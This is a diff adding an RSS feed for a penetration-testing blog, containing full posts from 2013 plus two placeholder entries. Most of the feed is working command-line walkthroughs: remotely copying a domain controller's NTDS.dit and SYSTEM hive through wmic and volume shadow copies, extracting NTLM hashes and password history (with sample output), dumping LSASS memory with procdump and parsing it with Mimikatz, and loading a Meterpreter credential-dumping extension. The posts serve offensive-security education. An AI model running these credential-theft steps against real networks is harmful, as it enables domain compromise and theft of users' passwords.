@@ -1,0 +1,923 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on Room362</title>
+    <link>http://localhost:1313/post/</link>
+    <description>Recent content in Posts on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Mon, 22 Feb 2016 13:58:46 -0500</lastBuildDate>
+    <atom:link href="http://localhost:1313/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Welcome</title>
+      <link>http://localhost:1313/post/Welcome/</link>
+      <pubDate>Mon, 22 Feb 2016 13:58:46 -0500</pubDate>
+      
+      <guid>http://localhost:1313/post/Welcome/</guid>
+      <description>&lt;p&gt;What would you configure in here?&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Testing</title>
+      <link>http://localhost:1313/post/post/</link>
+      <pubDate>Mon, 22 Feb 2016 13:50:29 -0500</pubDate>
+      
+      <guid>http://localhost:1313/post/post/</guid>
+      <description>&lt;p&gt;This is what I think of Hugo&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Testing Code
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2</title>
+      <link>http://localhost:1313/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/</link>
+      <pubDate>Mon, 10 Jun 2013 13:55:21 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/</guid>
+      <description>&lt;p&gt;Part 2, we have the NTDS.dit file and the SYSTEM.hive file. First we need a few tools:&lt;/p&gt;
+
+&lt;p&gt;From: &lt;a href=&#34;http://www.ntdsxtract.com/&#34;&gt;http://www.ntdsxtract.com/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Download: &lt;a href=&#34;http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip&#34;&gt;http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From: &lt;a href=&#34;http://code.google.com/p/libesedb/&#34;&gt;http://code.google.com/p/libesedb/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Download: &lt;a href=&#34;http://libesedb.googlecode.com/files/libesedb-alpha-20120102.tar.gz&#34;&gt;http://libesedb.googlecode.com/files/libesedb-alpha-20120102.tar.gz&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;wget http://libesedb.googlecode.com/files/libesedb-alpha-20120102.tar.gz
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Extract the tools:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;tar zxvf libesedb-alpha-20120102.tar.gz
+unzip ntdsxtract_v1_0.zip
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Compile/make libesedb:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@wpad:~/blog/# cd libesedb-20120102
+root@wpad:~/blog/libesedb-20120102# ./configure 
+root@wpad:~/blog/libesedb-20120102# make
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Export the tables from NTDS.dit:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@wpad:~/blog/libesedb-20120102# cd esedbtools/
+root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport 
+esedbexport 20120102
+
+Missing source file.
+Use esedbexport to export items stored in an Extensible Storage Engine (ESE)
+Database (EDB) file
+
+Usage: esedbexport [ -c codepage ] [ -l logfile ] [ -m mode ] [ -t target ]
+                   [ -T table_name ] [ -hvV ] source
+
+    source: the source file
+
+    -c:     codepage of ASCII strings, options: ascii, windows-874,
+            windows-932, windows-936, windows-1250, windows-1251,
+            windows-1252 (default), windows-1253, windows-1254
+            windows-1255, windows-1256, windows-1257 or windows-1258
+    -h:     shows this help
+    -l:     logs information about the exported items
+    -m:     export mode, option: all, tables (default)
+            &#39;all&#39; exports all the tables or a single specified table with indexes,
+            &#39;tables&#39; exports all the tables or a single specified table
+    -t:     specify the basename of the target directory to export to
+            (default is the source filename) esedbexport will add the suffix
+            .export to the basename
+    -T:     exports only a specific table
+    -v:     verbose output to stderr
+    -V:     print version
+root@wpad:~/blog/libesedb-20120102/esedbtools# 
+
+
+root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport ../../ntds.dit 
+esedbexport 20120102
+
+Opening file.
+Exporting table 1 (MSysObjects) out of 12.
+Exporting table 2 (MSysObjectsShadow) out of 12.
+Exporting table 3 (MSysUnicodeFixupVer2) out of 12.
+Exporting table 4 (datatable) out of 12.
+Exporting table 5 (hiddentable) out of 12.
+Exporting table 6 (link_table) out of 12.
+Exporting table 7 (sdpropcounttable) out of 12.
+Exporting table 8 (sdproptable) out of 12.
+Exporting table 9 (sd_table) out of 12.
+Exporting table 10 (MSysDefrag2) out of 12.
+Exporting table 11 (quota_table) out of 12.
+Exporting table 12 (quota_rebuild_progress_table) out of 12.
+Export completed.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Move the exported tables to somewhere a bit easier:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# 
+root@wpad:~/blog/libesedb-20120102/esedbtools# mv ntds.dit.export/ ../../
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;NTDS extract can do a lot more than just hashes:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@wpad:~/blog# cd NTDSXtract 1.0/
+root@wpad:~/blog/NTDSXtract 1.0# ls
+dscomputers.py  dsdeletedobjects.py  dsfileinformation.py  dsgroups.py  dstimeline.py  dsusers.py  framework  ntds
+root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py 
+DSUsers
+Extracts information related to user objects
+
+usage: dsusers.py   [option]
+  options:
+    --rid 
+          List user identified by RID
+    --name 
+          List user identified by Name
+    --passwordhashes 
+          Extract password hashes
+    --passwordhistory 
+          Extract password history
+    --certificates
+          Extract certificates
+    --supplcreds 
+          Extract kerberos keys
+    --membership
+          List groups of which the user is a member
+root@wpad:~/blog/NTDSXtract 1.0# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;But we like hashes:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes ../SYSTEM.hive --passwordhistory ../SYSTEM.hive 
+Running with options:
+    Extracting password hashes
+    Extracting password history
+Initialising engine...
+Scanning database - 100% -&amp;gt; 3475 records processed
+Extracting schema information - 100% -&amp;gt; 1549 records processed
+Extracting object links...
+
+List of users:
+==============
+
+Record ID:           3562
+User name:           Administrator
+User principal name: 
+SAM Account name:    Administrator
+SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+GUID: 7ceee337-fa58-4ca0-9643-540a40161020
+SID:  S-1-5-21-3825330677-773554443-1603823854-500
+When created:         2012-08-22 03:12:59
+When changed:         2013-05-15 04:06:55
+Account expires:      Never
+Password last set:    2012-08-22 02:49:42.899576
+Last logon:           2013-05-15 04:08:04.547236
+Last logon timestamp: 2013-05-15 04:06:55.577353
+Bad password time     2013-06-07 02:34:34.560516
+Logon count:          9
+Bad password count:   1
+User Account Control:
+    NORMAL_ACCOUNT
+Ancestors:
+    $ROOT_OBJECT$ net projectmentor Users Administrator 
+Password hashes:
+    Administrator:$NT$88e4d9fabaecf3ded18dd80905521b29:::
+Password history:
+
+Record ID:           3563
+User name:           Guest
+User principal name: 
+SAM Account name:    Guest
+SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+GUID: 659723d7-1246-4959-b0fc-af80ea5e3816
+SID:  S-1-5-21-3825330677-773554443-1603823854-501
+When created:         2012-08-22 03:12:59
+When changed:         2013-03-14 06:54:22
+Account expires:      Never
+Password last set:    2013-03-14 06:54:22.029303
+Last logon:           2013-03-14 06:54:27.012817
+Last logon timestamp: 2013-03-14 06:32:41.834022
+Bad password time     2013-06-07 03:07:46.499917
+Logon count:          0
+Bad password count:   10
+User Account Control:
+    PWD Not Required
+    NORMAL_ACCOUNT
+    PWD Never Expires
+Ancestors:
+    $ROOT_OBJECT$ net projectmentor Users Guest 
+Password hashes:
+    Guest:$NT$823893adfad2ada6e1a414f3ebdf58f7:::
+Password history:
+
+Record ID:           3564
+User name:           user
+User principal name: 
+SAM Account name:    user
+SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+GUID: c5a5c87a-93b4-4d80-97a1-1c605b9b0c03
+SID:  S-1-5-21-3825330677-773554443-1603823854-1000
+When created:         2012-08-22 03:12:59
+When changed:         2013-06-07 02:51:54
+Account expires:      Never
+Password last set:    2013-03-14 03:25:11.793912
+Last logon:           2013-06-07 02:51:54.152191
+Last logon timestamp: 2013-06-07 02:51:54.152191
+Bad password time     2013-04-19 05:25:40.412670
+Logon count:          67
+Bad password count:   0
+User Account Control:
+    NORMAL_ACCOUNT
+    PWD Never Expires
+Ancestors:
+    $ROOT_OBJECT$ net projectmentor Users user 
+Password hashes:
+    user:$NT$88e4d9fabaecf3dec18dd80905521b29:::
+Password history:
+    user_nthistory0:$NT$88e4d9fabafcf3dec18dd80905521b29:::
+    user_nthistory1:$NT$0c61031f010b2fbb88fe449fbf262477:::
+    user_nthistory2:$NT$88e4dffabaecf3dec18dd80905521b29:::
+    user_lmhistory0:c869027e01c3c4fe7626a90c87cc7fed:::
+    user_lmhistory1:8be023cd858da1edd21b94907afe182c:::
+
+Record ID:           3610
+User name:           krbtgt
+User principal name: 
+SAM Account name:    krbtgt
+SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+GUID: 74e6bd0b-e4d5-42df-98d5-24f9060061c9
+SID:  S-1-5-21-3825330677-773554443-1603823854-502
+When created:         2012-08-22 03:16:03
+When changed:         2012-08-22 03:31:13
+Account expires:      Never
+Password last set:    2012-08-22 03:16:03.166457
+Last logon:           Never
+Last logon timestamp: Never
+Bad password time     Never
+Logon count:          0
+Bad password count:   0
+User Account Control:
+    Disabled
+    NORMAL_ACCOUNT
+Ancestors:
+    $ROOT_OBJECT$ net projectmentor Users krbtgt 
+Password hashes:
+    krbtgt:$NT$7253e8647254716b507a2dcb149ff2da:::
+Password history:
+    krbtgt_nthistory0:$NT$7253e86a7254716a507a2dcb149ff2da:::
+    krbtgt_lmhistory0:113926e06a31d182623633041b632929:::
+
+Record ID:           3762
+User name:           John Doe
+User principal name: jdoe@projectmentor.net
+SAM Account name:    jdoe
+SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+GUID: bbf24c63-39a9-4cc4-8aa8-933f9ddee940
+SID:  S-1-5-21-3825330677-773554443-1603823854-1104
+When created:         2012-08-22 04:10:52
+When changed:         2013-06-05 13:04:11
+Account expires:      Never
+Password last set:    2013-04-19 07:11:49.849592
+Last logon:           2013-06-07 02:56:25.677855
+Last logon timestamp: 2013-06-05 13:04:11.674344
+Bad password time     2013-05-02 03:01:12.536251
+Logon count:          242
+Bad password count:   0
+User Account Control:
+    NORMAL_ACCOUNT
+    PWD Never Expires
+Ancestors:
+    $ROOT_OBJECT$ net projectmentor Users John Doe 
+Password hashes:
+    John Doe:$NT$88e4d9fabaecf3ded18dd80905511b29:::
+Password history:
+
+Record ID:           3797
+User name:           Random User
+User principal name: randy@projectmentor.net
+SAM Account name:    randy
+SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+GUID: 2701eb29-628a-4568-a093-d33a7db10d04
+SID:  S-1-5-21-3825330677-773554443-1603823854-1108
+When created:         2013-04-08 02:34:04
+When changed:         2013-05-27 16:06:07
+Account expires:      Never
+Password last set:    2013-04-19 06:59:25.423280
+Last logon:           2013-04-08 02:34:10.482690
+Last logon timestamp: 2013-04-08 02:34:10.482690
+Bad password time     Never
+Logon count:          1
+Bad password count:   0
+User Account Control:
+    NORMAL_ACCOUNT
+    PWD Never Expires
+Ancestors:
+    $ROOT_OBJECT$ net projectmentor Users Random User 
+Password hashes:
+    Random User:$NT$88ead9fa5aecf3dec18dd80905521b29:::
+Password history:
+root@wpad:~/blog/NTDSXtract 1.0# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;All done. Start crackin&amp;rsquo;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part1</title>
+      <link>http://localhost:1313/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part1/</link>
+      <pubDate>Mon, 10 Jun 2013 13:11:03 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part1/</guid>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;This and part 2 are mostly just an update to &lt;a href=&#34;http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html&#34;&gt;http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html&lt;/a&gt; but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Ever run into a Domain Controller that wasn&amp;rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case. Lets start&lt;/p&gt;
+
+&lt;p&gt;First authenticate to the domain controller and make sure you have a good working directory to use.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;net use \DC1 /user:DOMAINdomainadminsvc domainadminsvc123
+dir \DC1C$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Alright, lets say &amp;ldquo;TEMP&amp;rdquo; is there and it&amp;rsquo;s empty on the remote DC. The way we are going to run commands will not allow us to get results directly so we are going to use a temp file on the DC in C:TEMP where we already made sure is clear.&lt;/p&gt;
+
+&lt;p&gt;We are going to be using Volume Shadow Copies to pull the NTDS.dit file (Active Directory&amp;rsquo;s DB much like Window&amp;rsquo;s SAM file except that it stores the entire AD set of objects there), we also need the SYSTEM registry hive. You can get the SAM registry hive as well but that will only get local DC credentials.&lt;/p&gt;
+
+&lt;p&gt;So lets list the current volume shadow copies to see if we need to create one, from a Windows command prompt (or if you&amp;rsquo;ve installed wmic for Linux via &lt;a href=&#34;http://www.krenger.ch/blog/wmi-commands-from-linux/&#34;&gt;http://www.krenger.ch/blog/wmi-commands-from-linux/&lt;/a&gt; ) - this &lt;em&gt;IS&lt;/em&gt; an interactive command so this won&amp;rsquo;t work very nicely in a Meterpreter shell:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;C:temp&amp;gt;wmic /node:DC1 /user:DOMAINdomainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c vssadmin list shadows 2&amp;gt;&amp;amp;1 &amp;gt; C:tempoutput.txt&amp;quot;
+Executing (Win32_Process)-&amp;gt;Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+        ProcessId = 7304;
+        ReturnValue = 0;
+};
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To break down this command:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;wmic /node:DC1 - tells it to interact with the WMI API on DC1&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;/user:DOMAINdomainadminsvc /password:domainadminsvc123 - authentication&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;process call create - WMI speak for create a process&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;cmd /c - vssadmin doesn&amp;rsquo;t operate outside of cmd for some reason&amp;hellip;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;vssadmin list shadows - List any shadow volumes that already exist&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;2&amp;gt;&amp;amp;1 &amp;gt; C:tempoutput.txt - Take STDIN and STDERROR and throw it in a text file on DC1 C:TEMP. Make sure you specify full path because you will be executing from within C:WindowsSystem32 and its a pain to find anything in that directory. So if you just specify &amp;gt; bob.txt you get to hunt in C:WindowsSystem32 or wherever WMI wants to execute you from for bob.txt&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Process starts and then you need to view the output file by either copying it down, type \DC1C$TEMPoutput.txt or mount the C drive as a network share. Either way you should either see something like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;C:temp&amp;gt;type output.txt
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Copyright 2001-2005 Microsoft Corp.
+
+Contents of shadow copy set ID: {671090fd-0198}
+   Contained 1 shadow copies at creation time: 5/31/2013 11:29:03 AM
+      Shadow Copy ID: {0863e309}
+         Original Volume: (C:)\?Volume{c44da10e-0154-11e1-b968-806e6f6e6963}
+         Shadow Copy Volume: \?GLOBALROOTDeviceHarddiskVolumeShadowCopy1
+         Originating Machine: wpad
+         Service Machine: wpad
+         Provider: &#39;Microsoft Software Shadow Copy provider 1.0&#39;
+         Type: ClientAccessibleWriters
+         Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;or&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;C:temp&amp;gt;type output.txt
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Copyright 2001-2005 Microsoft Corp.
+
+No items found that satisfy the query
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If there are no shadow copies or the ones there are too old (look at the creation time), you can create a shadow copy using the &amp;lsquo;vssadmin create shadow /for=C: command. (This command only applies to Server OS (Win2k3/Win2k8) but since those are the only two that commonly have NTDS.dit files we don&amp;rsquo;t have to remember this):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;C:temp&amp;gt;wmic /node:DC1 /user:DOMAINdomainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c vssadmin create shadow /for=C: 2&amp;gt;&amp;amp;1 &amp;gt; C:tempoutput.txt&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The other thing to keep in mind is that NTDS.dit isn&amp;rsquo;t always on the main drive. It is commonly on a &amp;ldquo;D&amp;rdquo; drive for safety if a HDD goes bad or something. But it should always be in a folder called NTDS. (By default this is C:WindowsNTDS)&lt;/p&gt;
+
+&lt;p&gt;Next we just copy the files out of the shadow copies. First the SYSTEM hive:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;C:temp&amp;gt;wmic /node:DC1 /user:DOMAINdomainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy1WindowsSystem32configSYSTEM C:tempSYSTEM.hive 2&amp;gt;&amp;amp;1 &amp;gt; C:tempoutput.txt&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then the NTDS.dit (notice this one isn&amp;rsquo;t in System32):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;C:temp&amp;gt;wmic /node:DC1 /user:DOMAINdomainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy2WindowsNTDSNTDS.dit C:tempNTDS.dit 2&amp;gt;&amp;amp;1 &amp;gt; C:tempoutput.txt&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In Kali Linux you could use the WMIS package to do much the same thing:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# wmis -U DOMAINdomainadminsvc%domainadminsvc123 //DC1 cmd.exe /c copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy2WindowsNTDSNTDS.dit C:tempNTDS.dit 2&amp;gt;&amp;amp;1 &amp;gt; C:tempoutput.txt
+NTSTATUS: NT_STATUS_OK - Success
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Copy those files to your own system for offline extraction which I&amp;rsquo;ll cover in part 2.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</title>
+      <link>http://localhost:1313/post/2013/201367using-mimikatz-alpha-or-getting-clear-text-passwords-with-a-html/</link>
+      <pubDate>Fri, 07 Jun 2013 15:00:08 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/201367using-mimikatz-alpha-or-getting-clear-text-passwords-with-a-html/</guid>
+      <description>&lt;p&gt;Mimikatz is now&lt;a href=&#34;https://github.com/rapid7/meterpreter/pull/9&#34;&gt; built into Metasploit&amp;rsquo;s meterpreter&lt;/a&gt;, you can do load mimikatz from the meterpreter prompt, but if you don&amp;rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&amp;rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.&lt;/p&gt;
+
+&lt;p&gt;Mimikatz Minidump: &lt;a href=&#34;http://blog.gentilkiwi.com/securite/mimikatz/minidump&#34;&gt;http://blog.gentilkiwi.com/securite/mimikatz/minidump&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Procdump: &lt;a href=&#34;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&#34;&gt;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;net use \TARGETBOXC$ /user:DOMAINserviceaccount serviceaccount123
+dir \TARGETBOXC$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If that works then we want to check that we can all the &amp;ldquo;AT&amp;rdquo; command on the remote host:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;at \TARGETBOX
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;All set. Next lets prep our workspace on the remote host. We are using the C:Temp directory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mkdir \TARGETBOXC$Temp
+dir \TARGETBOXC$Temp
+copy c:tempprocdump.exe \TARGETBOXC$
+copy c:tempprocdump.bat \TARGETBOXC$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The contents of procdump.bat are:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;@echo off
+C:tempprocdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I&amp;rsquo;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&amp;rsquo;ve dumped more than one IP that is actually the same host.&lt;/p&gt;
+
+&lt;p&gt;Next we schedule the task. Use net time to determine the local time for the remote machine.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;net time \TARGETBOX
+at \TARGETBOX 13:52 C:Tempprocdump.bat
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Pull down the file and clean up:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;dir \TARGETBOXC$Temp
+copy \TARGETBOXC$Temp*lsass.dmp C:tempoutput
+rmdir /s \TARGETBOXC$Temp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:&lt;a href=&#34;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&#34;&gt;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Load up the Alpha version of Mimikatz, switch it to minidump mode and you&amp;rsquo;re dumping creds:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
+Switch to MINIDUMP
+
+mimikatz # sekurlsa::logonPasswords full
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thats it. Password dumping without ever using a &amp;ldquo;Hacker&amp;rdquo; tool on target. Much love Microsoft. And even more to Mimikatz creator &lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; - Benjamin Delpy for both this alpha release and changing his licensing to allow Mimikatz code to be integrated into Meterpreter.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Query all windows services config from the command line</title>
+      <link>http://localhost:1313/post/2013/2013/5/29/query-all-windows-services-config-from-the-command-line/</link>
+      <pubDate>Thu, 30 May 2013 02:56:57 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013/5/29/query-all-windows-services-config-from-the-command-line/</guid>
+      <description>&lt;p&gt;This is how I did it:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;for /f &amp;quot;tokens=5 delims=&amp;quot; %A in (&#39;reg query HKLMSYSTEMCurrentControlSetServices&#39;) do sc qc %A&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Let me know if you know of a better way.&lt;/p&gt;
+
+&lt;p&gt;If you don&amp;rsquo;t know why this could be important read here:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.ihtb.org/security/program.exe-privilege_escalation.txt&#34;&gt;http://www.ihtb.org/security/program.exe-privilege_escalation.txt&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;If you are on a Win7 box or otherwise have the option to use WMI you can use the following command:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;wmic service get pathname&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Sessiondump Meterpreter Extension</title>
+      <link>http://localhost:1313/post/2013/2013/4/8/sessiondump-meterpreter-extension/</link>
+      <pubDate>Mon, 08 Apr 2013 09:58:20 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013/4/8/sessiondump-meterpreter-extension/</guid>
+      <description>&lt;p&gt;Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory &lt;a href=&#34;http://localhost:1313/blog/2012/9/6/completely-in-memory-mimikatz-with-metasploit.html&#34;&gt;{link}&lt;/a&gt; - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.&lt;/p&gt;
+
+&lt;p&gt;Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0820at205-55-4820am.png.48%20AM.png&#34; alt=&#34;Screen Shot 2013 04 08 at 5 55 48 AM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No blog post or huge Vegas lights talk on it at DefCon or Blackhat. Just posted online in a corner of the Internet:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at206-57-4020pm.png.40%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 6 57 40 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.hsc.fr/ressources/outils/sessiondump/&#34;&gt;http://www.hsc.fr/ressources/outils/sessiondump/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Before we get started lets be clear about one thing. Sessiondump while awesome doesn&amp;rsquo;t do everything that Mimikatz does. However, it does do the feature of mimikatz that I do use the most, the logged on user hash dumping as well as the wdigest clear text password dumping. It does this as a Meterpreter extension that operates using reflective DLL injection. Does that solve our minor issues we had with mimikatz, as of right now, only partially. This code was simply posted online, not in a pull request or submitted to Metasploit in any way. So you still have to have the binary + code. What about the remembering, surely it makes it so I can just tab complete my way to passwords right? Yup, it does, but until/if it is in the Metasploit trunk you will still have to remember how to get it installed (which we will go over in a bit). The final question is yes it does still transfer a complete DLL over to the host same as any of the other extensions (not to disk mind you, just memory),.&lt;/p&gt;
+
+&lt;p&gt;Without further ado lets go ahead and get the file and do a bunch of extracting. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at207-15-0220pm.png.02%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 7 15 02 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at207-15-5420pm.png.54%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 7 15 54 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And finally placing everything in it&amp;rsquo;s correct place, which was nice of the author to make easy by making the archive the same as the Metasploit directory structure:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0820at202-33-3120am.png.31%20AM.png&#34; alt=&#34;Screen Shot 2013 04 08 at 2 33 31 AM&#34; /&gt;&lt;/p&gt;
+
